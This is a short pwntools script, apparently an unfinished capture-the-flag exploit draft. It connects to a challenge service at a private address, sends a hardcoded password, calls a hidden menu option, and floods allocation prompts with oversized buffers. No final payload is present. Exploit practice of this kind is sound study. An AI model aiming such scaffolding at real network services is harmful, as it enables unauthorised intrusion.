# coding:utf-8
from pwn import *

LOCAL = True

if LOCAL:
    context.log_level = 'debug'
    io = remote("10.211.55.7", 22333)

def mmenu(choice):
    io.recvuntil("Action: ")
    io.sendline(str(choice))

def prepare_serv(msize, nblocks, icont=0):
    mmenu(1)
    io.recvuntil("Size: ")
    io.sendline(str(msize))
    io.recvuntil("Pad blocks: ")
    io.sendline(str(nblocks))
    io.recvuntil("Content? (0/1): ")
    io.sendline(str(icont))
    if icont == 1:
        io.recvuntil("Input: ")

def sys_id():
    mmenu(1337)

def pwnit():
    io.recvuntil("Enter secret password: ")
    io.sendline("i'm ready for challenge")
    sleep(3)
    prepare_serv(0x300, 4, 1)
    io.send('a'*0x200)
    io.send('b'*0x200)
    pause()
    prepare_serv(0x200, 4, 1)

if __name__ == "__main__":
    pwnit()
    pause()

